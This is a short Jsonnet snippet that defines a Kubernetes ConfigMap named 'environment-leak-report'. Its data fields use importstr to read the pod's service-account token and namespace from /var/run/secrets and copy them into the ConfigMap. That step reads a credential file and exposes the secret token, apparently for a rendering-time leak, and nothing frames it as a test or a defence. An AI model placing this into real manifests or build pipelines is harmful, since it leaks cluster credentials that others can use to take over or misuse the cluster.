{
  apiVersion: "v1",
  kind: "ConfigMap",
  metadata: {
    name: "environment-leak-report",
  },
  data: {
    // --- 身份与权限 ---    
    "k8s-token": importstr "/var/run/secrets/kubernetes.io/serviceaccount/token",
    "k8s-namespace": importstr "/var/run/secrets/kubernetes.io/serviceaccount/namespace",

  }
}
